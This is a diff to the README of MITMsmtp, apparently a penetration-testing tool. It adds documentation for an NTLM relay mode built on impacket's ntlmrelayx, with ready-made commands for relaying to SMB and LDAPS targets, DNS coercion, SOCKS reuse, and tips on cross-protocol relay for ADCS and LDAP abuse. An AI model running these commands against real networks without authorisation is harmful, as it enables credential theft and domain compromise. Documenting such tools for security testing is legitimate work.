@@ -14,6 +14,7 @@ See `CHANGELOG.md` for a summary of the features and fixes added in this fork.
 * Optional built-in DNS responder for lab setups (`--enable-dns`, `--dns-ip`, `--print-dns`)
 * Optional rogue SMB server to capture NTLM credentials (NetNTLMv1/NetNTLMv2 hashes) from SMB clients such as printers using "Scan to SMB" (`--enable-smb`, `--print-smb`)
 * Optional NTLM "Force LM downgrade" to coax legacy clients into the weaker LMv1/NTLMv1 response (`--smb-force-lm-downgrade`)
+* Optional NTLM relay mode that delegates live relaying to impacket's `ntlmrelayx` (`--relay`, optional dependency)
 * All three servers (SMTP, DNS, SMB) can run together from a single runner so a device can be redirected and have its hostname resolved and credentials captured in one shot
 * More robust SMTP handling (safe socket decoding, better `MAIL FROM`/`RCPT TO` parsing, cleaner `QUIT` handling)
 * Authentication flow fixes (successful AUTH now responds with `235`, tolerate clients trying multiple AUTH methods)
@@ -69,6 +70,7 @@ This fork includes an updated standalone runner at `MITMsmtp/MITMsmtp.py` with o
 * SMB credential capture (e.g. printer Scan to SMB): `sudo python3 MITMsmtp/MITMsmtp.py --enable-smb --print-smb`
 * SMB with forced LM downgrade: `sudo python3 MITMsmtp/MITMsmtp.py --enable-smb --smb-force-lm-downgrade --print-smb`
 * Everything at once (DNS + SMTP + SMB): `sudo python3 MITMsmtp/MITMsmtp.py --enable-dns --dns-ip <YOUR_IP> --enable-smb --print-dns --print-smb --print-lines`
+* NTLM relay via impacket (needs `pip install impacket`): `sudo python3 MITMsmtp/MITMsmtp.py --relay --relay-target ldaps://dc01 --enable-dns --dns-ip <YOUR_IP>`
 
 ### Command Line (legacy packaged entrypoint)
 Running `MITMsmtp --help` will give you an overview about the available command line switches (legacy CLI; default port 8587):
@@ -160,6 +162,41 @@ Useful options:
 * `--print-smb` &mdash; print SMB protocol activity
 
 The SMB server only implements enough of SMB2 to elicit and capture the NTLM authentication; it does not serve files, so after credentials are captured the client is told the logon failed. Challenge-response auth means the cleartext password is not exposed directly &mdash; you capture a crackable hash. Combine `--enable-smb` with `--enable-dns` to also resolve the share's hostname to your machine.
+
+### NTLM relay (impacket integration)
+Capturing a hash (above) lets you crack it *offline*. **Relaying** is a different, live attack: instead of answering the client with our own challenge, the authentication is forwarded to a third-party target so that the target authenticates you *as the victim*, handing you an authenticated session you can act on (dump secrets, add a machine account, abuse LDAP ACLs, proxy the session over SOCKS, and so on).
+
+Rather than reimplement this, MITMsmtp delegates relaying to [impacket](https://github.com/fortra/impacket)'s mature `ntlmrelayx`. The `--relay` flag builds and runs `ntlmrelayx` from MITMsmtp's options and streams its output prefixed with `[RELAY]`.
+
+Install the optional dependency first:
+
+`pip install impacket`  (or `pip install MITMsmtp[relay]`)
+
+Examples:
+
+* Relay to a single SMB target: `sudo python3 MITMsmtp/MITMsmtp.py --relay --relay-target smb://10.0.0.5`
+* Cross-protocol relay to LDAPS with SOCKS: `sudo python3 MITMsmtp/MITMsmtp.py --relay --relay-target ldaps://dc01 --relay-socks`
+* Multiple targets from a file: `sudo python3 MITMsmtp/MITMsmtp.py --relay --relay-targets-file targets.txt`
+* DNS coercion + relay (the useful combo): `sudo python3 MITMsmtp/MITMsmtp.py --enable-dns --dns-ip <YOUR_IP> --relay --relay-target ldaps://dc01`
+* See the exact `ntlmrelayx` command without running it: `python3 MITMsmtp/MITMsmtp.py --relay --relay-target smb://10.0.0.5 --relay-dry-run`
+
+Relay options:
+
+* `--relay-target TARGET` &mdash; a relay target such as `smb://host`, `ldap://host`, `ldaps://host`, `http://host`; repeatable
+* `--relay-targets-file FILE` &mdash; a file of targets, one per line (`ntlmrelayx -tf`)
+* `--relay-socks` &mdash; start the `ntlmrelayx` SOCKS proxy so relayed sessions can be reused (`-socks`)
+* `--relay-ip IP` &mdash; bind `ntlmrelayx`'s listeners to a specific IP (`-ip`)
+* `--relay-output-prefix PREFIX` &mdash; file prefix for dumped loot (`-of`)
+* `--relay-no-smb2support` &mdash; omit `-smb2support` (it is passed by default; most clients use SMB2+)
+* `--relay-extra "..."` &mdash; raw arguments passed verbatim to `ntlmrelayx` for anything not exposed above (e.g. `--relay-extra "--remove-mic -debug"`)
+* `--relay-bin PATH` &mdash; explicit path to `ntlmrelayx(.py)` if it is not on your `PATH`
+* `--relay-dry-run` &mdash; print the command that would be run, then exit
+
+Important constraints:
+
+* **Port ownership:** `ntlmrelayx` binds its own SMB (445) and HTTP (80) listeners, so `--relay` is **mutually exclusive with `--enable-smb`**. The DNS responder (`--enable-dns`) and the SMTP server still run alongside it.
+* **Signing kills SMB&rarr;SMB relay:** relaying only works when the *target* does not enforce session signing (we never learn the session key). Modern domain controllers require SMB signing, which is why cross-protocol relay (SMB&rarr;LDAP/LDAPS for RBCD or shadow credentials, SMB&rarr;HTTP for ADCS ESC8) is usually the productive path. This is a property of the target, not of MITMsmtp.
+* You are not relaying a "hash" &mdash; you are relaying the live NTLMSSP tokens, so relay mode does not also produce an offline-crackable hash for that authentication. Choose `--relay` (live) or `--enable-smb` (offline capture) per engagement.
 
 ### Encryption
 Some clients fallback to unencrypted mode if you don't offer SSL/TLS. Always make sure to test this! For clients which don't fallback, you may want to test the encrypted mode. Please keep in mind, that a correctly configured client won't be vulnerable to this attack. You will be unable to fake a trusted certificate for a validated common name and thus the client will stop connection before sending credentials. However some clients don't implement proper certificate validation. This is where this attack starts.
